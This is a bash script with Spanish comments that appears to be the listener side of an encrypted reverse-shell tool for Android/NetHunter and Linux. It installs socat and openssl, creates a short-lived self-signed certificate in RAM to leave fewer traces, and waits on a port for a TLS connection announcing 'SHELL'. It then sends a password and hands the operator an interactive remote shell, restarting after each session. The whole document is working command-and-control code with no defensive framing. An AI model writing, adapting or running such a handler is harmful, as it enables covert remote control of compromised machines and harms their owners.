#!/bin/bash
PORT=${1:-4444}
PASS=$2

if [ -z "$PASS" ]; then echo "Uso: $0 <puerto> <pass>"; exit 1; fi

# --- MOSTRAR INTERFACES DE RED (Soporte Robusto para Android/NetHunter) ---
echo -e "\e[1;34m[*] Interfaces disponibles:\e[0m"

# Intentar obtener IPs con 'ip addr', si da error de permiso, saltar a 'ifconfig'
IP_OUTPUT=$(ip -4 -o addr show 2>/dev/null)

if [ $? -eq 0 ] && [ -n "$IP_OUTPUT" ]; then
    # Caso: 'ip' funciona correctamente
    echo "$IP_OUTPUT" | awk '{print $2 " - " $4}' | cut -d/ -f1 | grep -v "lo" | head -n 5 | while read -r line; do
        echo -e "    \e[1;33m→\e[0m $line"
    done
elif command -v ifconfig &> /dev/null; then
    # Caso: 'ip' falló (Permission Denied) o no existe, usamos ifconfig
    ifconfig 2>/dev/null | awk '/inet / {print $1 " " $2}' | grep -v "127.0.0.1" | head -n 5 | while read -r line; do
        # Limpieza de "addr:" y asegurar formato Interfaz - IP
        iface=$(echo $line | awk '{print $1}' | sed 's/://')
        ip_addr=$(echo $line | awk '{print $2}' | sed 's/addr://')
        echo -e "    \e[1;33m→\e[0m $iface - $ip_addr"
    done
else
    echo -e "    \e[1;31m[!]\e[0m No se pudo detectar IP (permisos insuficientes)"
fi
echo ""

# --- VERIFICACIÓN DE DEPENDENCIAS ---
DEPS=("socat" "openssl")
for tool in "${DEPS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "\e[1;31m[!]\e[0m $tool no encontrado. Intentando instalar..."
        if command -v pkg &> /dev/null; then
            pkg install -y "$tool"
        elif command -v apt-get &> /dev/null; then
            sudo apt-get update && sudo apt-get install -y "$tool"
        fi
        
        if [ $? -ne 0 ]; then
            echo "[-] Error al instalar $tool."
            exit 1
        fi
    fi
done

# --- CONFIGURACIÓN DE CERTIFICADOS EN RAM ---
# Fallback dinámico de directorios temporales
RAM_DIR="/dev/shm"
[ ! -d "$RAM_DIR" ] && RAM_DIR="/tmp"
[ ! -w "$RAM_DIR" ] && RAM_DIR="." # Si /tmp no es escribible, usar dir actual

CERT="$RAM_DIR/cert.pem"; KEY="$RAM_DIR/key.pem"; COMBINED="$RAM_DIR/server.pem"
openssl req -x509 -newkey rsa:4096 -keyout "$KEY" -out "$CERT" -days 1 -nodes -subj "/C=US/O=Dev/CN=localhost" 2>/dev/null
cat "$KEY" "$CERT" > "$COMBINED"

trap "rm -f $KEY $CERT $COMBINED; echo -e '\n\e[1;31m[-]\e[0m Limpiando y saliendo...'; exit" SIGINT

# --- BUCLE PRINCIPAL ---
while true; do
    echo -e "\e[1;32m[+]\e[0m Esperando TLS con SOCAT en puerto \e[1;33m$PORT\e[0m..."
    
    IDENT=$(socat -T 2 OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr - | head -n 1 | tr -d '\r\n')
    
    if [[ "$IDENT" == *"SHELL"* ]]; then
        echo -e "[*] Handshake: \e[1;36m$IDENT\e[0m. Validando con pass: \e[1;33m$PASS\e[0m"
        (sleep 1; echo "$PASS"; cat) | socat OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr -
        echo -e "\n\e[1;34m[*]\e[0m Sesión finalizada. Volviendo a escucha..."
    fi
done
